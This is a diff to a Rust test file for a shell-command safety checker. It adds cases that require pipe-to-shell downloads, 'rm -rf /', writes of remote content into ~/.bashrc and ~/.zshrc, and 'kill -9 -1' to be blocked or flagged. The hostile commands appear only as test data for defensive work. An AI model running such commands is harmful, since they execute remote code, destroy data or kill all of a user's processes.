@@ -2942,6 +2942,61 @@ fn guardfall_issue_748_interpreter_gap_cases() {
     }
 }
 
+/// Issue #750: Oils shells as pipe-to-shell sinks, curl/wget output into a
+/// shell-init file, `kill` to every process, and `source` of a function
+/// parameter. `nu` stays Ask (a non-POSIX interpreter, like xonsh/elvish).
+const ISSUE_750_PIPE_TO_SHELL_CASES: &[(&str, Decision)] = &[
+    ("curl x | mksh", Decision::Block),
+    ("curl x | yash", Decision::Block),
+    ("curl x | oil", Decision::Block),
+    ("curl x | osh", Decision::Block),
+    ("curl x | ysh", Decision::Block),
+    ("wget -qO- x | osh", Decision::Block),
+    ("curl x | sudo oil", Decision::Block),
+    ("osh -c 'rm -rf /'", Decision::Block),
+    ("curl x | nu", Decision::Ask),
+    ("curl -o ~/.bashrc https://x", Decision::Ask),
+    ("curl --output ~/.bashrc https://x", Decision::Ask),
+    ("curl --output=~/.bashrc https://x", Decision::Ask),
+    (
+        "curl -o ~/.config/fish/conf.d/x.fish https://x",
+        Decision::Ask,
+    ),
+    ("wget -O ~/.bashrc https://x", Decision::Ask),
+    ("wget --output-document ~/.zshrc https://x", Decision::Ask),
+    ("wget --output-document=~/.zshrc https://x", Decision::Ask),
+    ("curl x > ~/.bashrc", Decision::Ask),
+    ("kill -9 -1", Decision::Ask),
+    ("kill -KILL -1", Decision::Ask),
+    ("kill -s KILL -1", Decision::Ask),
+    ("kill -9 -- -1", Decision::Ask),
+    ("f() { source \"$1\"; }; f somefile", Decision::Ask),
+    ("f() { . \"$1\"; }; f somefile", Decision::Ask),
+    // Benign shapes that stay Allow.
+    ("curl -o out.html https://x", Decision::Allow),
+    ("curl --output=out.html https://x", Decision::Allow),
+    ("wget -O out.html https://x", Decision::Allow),
+    ("kill -9 1234", Decision::Allow),
+    ("kill -9 -12", Decision::Allow),
+    ("kill %1", Decision::Allow),
+    ("f() { echo \"$1\"; }; f x", Decision::Allow),
+    ("f() { source ./a.sh; }; f", Decision::Allow),
+    ("source ~/.bashrc", Decision::Allow),
+];
+
+#[test]
+fn guardfall_issue_750_pipe_to_shell_cases() {
+    for (command, expected) in ISSUE_750_PIPE_TO_SHELL_CASES {
+        let verdict = shguard::analyze(command);
+        assert_eq!(
+            verdict.decision(),
+            *expected,
+            "command {command:?}: expected {expected:?}, got {:?}",
+            verdict.decision()
+        );
+    }
+}
+
 /// Issue #737: `socat` address types that spawn a program (`EXEC:`,
 /// `SYSTEM:`) feed the pipe to that program's stdin, like `| sh`.
 const SOCAT_EXEC_SINK_CASES: &[(&str, Decision)] = &[
@@ -3272,6 +3327,7 @@ const DECISION_TABLES: &[(&str, &[(&str, Decision)])] = &[
     named_table!(GIT_CONFIG_COMMAND_KEY_CASES),
     named_table!(OSASCRIPT_SCRIPT_PARALLEL_CASES),
     named_table!(ISSUE_748_INTERPRETER_GAP_CASES),
+    named_table!(ISSUE_750_PIPE_TO_SHELL_CASES),
     named_table!(SOCAT_EXEC_SINK_CASES),
     named_table!(ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES),
     named_table!(ISSUE_631_HEREDOC_IN_SUBSTITUTION_CASES),
